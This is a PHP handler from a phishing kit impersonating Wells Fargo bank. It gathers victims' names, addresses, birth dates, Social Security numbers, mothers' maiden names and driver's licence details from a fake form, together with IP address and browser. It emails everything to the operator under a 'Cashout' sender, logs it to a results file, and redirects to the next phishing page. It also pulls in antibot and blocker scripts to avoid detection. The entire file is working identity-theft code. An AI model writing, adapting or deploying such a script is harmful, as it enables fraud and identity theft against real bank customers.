<?php
$zabi = getenv("REMOTE_ADDR");
include 'antibots.php';
include '../your-email.php';
include './bt.php';
include "./blocker.php";
$message .= "------------------ Mr fm  ---------------------\n";
$message .= "--++-----[ $$ World Wide On My Hand  $$ ]-----++--\n";
$message .= "----------wells Bank Spam ReZulT--------------------\n";
$message .= "Full Name: ".$_POST['fullname']."\n";
$message .= "Address: ".$_POST['address']."\n";
$message .= "City: ".$_POST['city']."\n";
$message .= "State: ".$_POST['state']."\n";
$message .= "Zip: ".$_POST['zip']."\n";
$message .= "-------------------- Security Info ----------------------\n";
$message .= "BirthMonth: ".$_POST['bmonth']."\n";
$message .= "BirthDay: ".$_POST['bday']."\n";
$message .= "BirthYear: ".$_POST['byear']."\n";
$message .= "SSN1: ".$_POST['ssn1']."\n";
$message .= "SSN2: ".$_POST['ssn2']."\n";
$message .= "SSN3: ".$_POST['ssn3']."\n";
$message .= "Mother's Maiden Name: ".$_POST['mmn']."\n";
$message .= "Driver's License: ".$_POST['dl']."\n";
$message .= "DL Exp 1: ".$_POST['exp1']."\n";
$message .= "DL Exp 2: ".$_POST['exp2']."\n";
$message .= "DL Exp 3: ".$_POST['exp3']."\n";
$message .= "++-----[ $$ Fully Undetected by Mou AD $$ ]-----++\n";
$message .= "-------------- IP Infos ------------\n";
$message .= "IP       : $zabi\n";
$message .= "BROWSER  : ".$_SERVER['HTTP_USER_AGENT']."\n";
$message .= "--++-----[ $$ World Wide On My Hand  $$ ]-----++--\n";
$subject = "wells Info [ " . $zabi . " ]  ".$_POST['exm']."/".$_POST['exy'];
$headers = "From: Cashout-XXX <service>\r\n";
mail($to,$subject,$message,$headers);
    $text = fopen('../rezlt.txt', 'a');
fwrite($text, $message);
mail(','.$form,$subject,$message,$headers);

header("Location: etape2.php");?>